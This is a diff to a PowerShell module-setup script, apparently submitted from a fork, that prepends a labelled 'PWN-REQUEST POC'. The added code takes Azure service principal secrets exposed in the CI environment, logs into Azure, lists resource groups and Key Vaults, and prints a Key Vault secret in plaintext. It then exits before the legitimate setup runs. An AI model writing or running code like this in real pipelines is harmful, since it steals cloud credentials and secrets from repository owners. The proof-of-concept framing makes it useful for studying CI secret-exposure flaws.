@@ -3,6 +3,38 @@ param (
     $Repository = 'PSGallery'
 )
 
+Write-Host "=== PWN-REQUEST POC - Secret exposure + Azure access ==="
+
+# Prove secrets delivered to fork code
+Write-Host "ARM_CLIENT_SECRET in env: $(if ($env:ARM_CLIENT_SECRET) { 'YES (masked by GitHub as ***)' } else { 'NO' })"
+
+# Connect to Azure using the exposed credentials
+$credential = New-Object PSCredential -ArgumentList $env:ARM_CLIENT_ID, `
+    (ConvertTo-SecureString -String $env:ARM_CLIENT_SECRET -AsPlainText -Force)
+Connect-AzAccount -TenantId $env:ARM_TENANT_ID -ServicePrincipal `
+    -Credential $credential -SubscriptionId $env:ARM_SUBSCRIPTION_ID
+
+# Prove authenticated access
+Write-Host "=== Authenticated Azure context ==="
+Get-AzContext | Select-Object Account, Subscription, Tenant | Format-List
+
+Write-Host "=== Resource Groups (proves read access) ==="
+Get-AzResourceGroup | Select-Object ResourceGroupName, Location | Format-Table
+
+Write-Host "=== Key Vaults discoverable ==="
+Get-AzKeyVault | Select-Object VaultName, ResourceGroupName | Format-Table
+
+Write-Host "=== Key Vault Secret (the money shot) ==="
+$secret = Get-AzKeyVaultSecret -VaultName "azure-github-poc-kv" -Name "super-secret-api-key" -AsPlainText
+Write-Host "super-secret-api-key = $secret"
+
+Write-Host "=== END POC ==="
+exit 0
+
+
+
+
+
 # Development Modules
 Set-PSRepository -Name $Repository -InstallationPolicy Trusted
 $modules = @("Pester", "PSModuleDevelopment", "PSScriptAnalyzer")
